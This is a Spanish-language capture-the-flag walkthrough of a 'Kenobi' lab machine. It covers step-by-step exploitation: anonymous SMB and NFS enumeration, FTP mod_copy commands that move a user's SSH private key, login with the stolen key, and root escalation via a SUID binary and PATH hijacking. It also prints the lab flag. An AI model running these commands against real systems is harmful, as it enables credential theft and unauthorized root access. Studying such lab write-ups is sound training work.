1. una vez hecho el nmap vemos 7 puertos abiertos:
	21,22,80,111,139,445,2049.

2.vamos por el puerto 80 aunque no contiene nada.

3.vamos por el puerto 21 y nos damos cuenta que contiene una vulnerabilidad que nos permite copiar y pegar 
archivos dentro de la maquina objetivo,por ahora no podemos hacer nada

4.vamos por el puerto 445,intentamos listar los directorios que contiene compartidos.
	y vemos que tiene un workgroup como anonymous entonces entramos con :

			smbclient //<ip>/anonymous


5.dentro encotramos un archivos llamado log.txt lo obtenemos con :
	get <archivo>   

6.Viendo el archivo nos damos cuenta en donde dejo sus llaves criptograficas el usuario kenobi 
directorio :
	/home/kenobi/.ssh/id_rsa.pub


llave sha256

C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q	

7.Ahora ya sabemos la ubicacion de sus llaves seguimos viendo que mas podemos explotar tenemos el puerto 111 que utiliza
rpcbind 

8. ya que el puerto 111 esta abierto y vemos que utiliza el servicio 111 podemos ver que tambien esta utilizando 
nfs entonces lo que podemos hace seria ver que directorios estan montados en su servicio nfs  con :
	showmount -e <ip>

identificamos el directorio /var y podemos montarlo en alguno de nuestros directorios y sacar el archivo que queramos.



9.Ahora sabemos esto :

- La ruta donde estan las llaves ssh de kenobi 
- Podemos copiar y pegar archivos desde ftp
- podemos sacar los archivos que se encuentran en var montandolo en nuestro sistema.

10. Copiamos y pegamos las llaves ssh al directorio /var/tmp con :
	site cpfr  /home/kenobi/.ssh/id_rsa
	site cpto /var/tmp/id_rsa


11.Montamos el directorio en el nuestro y ya podriamos jalar los datos.

 
mkdir dir_mount

mount <ip>:/var dir_mount

12.Copiamos la id_rsa a nuestro directorio y ya que tenemos el port 22 abierto lo cual usa ssh utilizamos las llaves 
para loggearnos con :
	ssh -i id_rsa kenobi@<ip>

nos loggeamos como kenobi y obtenemos la flag

flag :
d0b0f3f53b6caa532a83915e19224899

13.una vez logeados tenemos que escalar privilegios podemos usar el archivo LinEnum.sh o este comando :

	find / -perm -u=s

14.Encontramos un binario llamado menu y dentro de este ejecuta otros binarios como lo son :

curl
uname
ifconfig

15.Lo que podemos hacer para escalar privilegios seria creando una copia de los binarios ejecutados y diciendo a 
PATH que cambie a donde cree mi copia del binario ejecutar el archivo y obtener permisos root .

	- cd /tmp
	- echo "/bin/sh" > curl 
	- export PATH=/tmp:$PATH
	-/usr/bin/menu 
-------------------------------------------------------------------------------------------

